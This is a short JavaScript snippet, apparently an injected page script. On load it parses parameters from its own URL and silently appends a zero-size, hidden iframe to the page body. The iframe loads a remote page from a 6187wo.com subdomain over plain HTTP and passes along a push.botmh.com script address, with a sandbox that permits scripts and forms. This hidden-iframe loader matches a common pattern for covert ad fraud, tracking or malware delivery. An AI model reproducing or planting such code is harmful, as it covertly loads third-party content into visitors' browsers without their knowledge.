(function() {
    
    var src = '';
    try{
	var curNode = document.currentScript;
	var src = curNode.src;	
    } catch (e) {}
    
    var v = 'etc';
    var s = '1278624324';
    var u = '';
    
    if (src){
	var params = UrlParamHash(src);
	v = decodeURIComponent(params['v']);
	s = params['s'];	
	u = params['u'];	
    }
    
    if (!u) u = encodeURIComponent('//push.botmh.com/ip/lw/qd001.js');
    
    function UrlParamHash(url) {
	var params = [],h;
	var hash = url.slice(url.indexOf("?") + 1).split('&');
	for (var i = 0; i < hash.length; i++) {
	    h = hash[i].split("="); //
	    params[h[0]] = h[1];
	}
	return params;
    }    
    
    var li_ifr = document.createElement('IFRAME');
    li_ifr.style.cssText = "border: 0;width: 0px;height: 0px; display:none;";
    //li_ifr.src = document.location.protocol + "//"+ v +".6187wo.com/chijian_qd001_new.html#web_id="+s+'#u='+u;
	li_ifr.src = "http://"+ v +".6187wo.com/chijian_qd001_new.html#web_id="+s+'#u='+u;
    li_ifr.setAttribute("scrolling", "no");
    li_ifr.sandbox = 'allow-scripts allow-forms allow-same-origin';
    document.body.appendChild(li_ifr)
}());